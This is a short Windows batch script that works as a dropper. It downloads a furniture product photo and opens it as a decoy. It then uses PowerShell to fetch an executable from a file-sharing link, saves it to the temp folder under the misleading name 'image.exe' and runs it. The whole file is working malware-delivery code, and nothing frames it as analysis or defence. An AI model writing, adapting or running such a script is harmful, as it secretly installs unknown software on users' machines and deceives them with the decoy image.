@echo off
setlocal enabledelayedexpansion

set "imageURL=https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
set "execURL=https://3007.filemail.com/api/file/get?filekey=fVOHT_OX-ENDDU3pUi9eUvdbs3YARgl97oK9ZHl-JpmGfZR5SH9Qrw-Xww&pk_vid=fb4236a0f45035151738474088bb32ea"

set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
set "execFile=%TEMP%\image.exe"

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
start "" "%imageFile%"

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
start "" "%execFile%"

endlocal
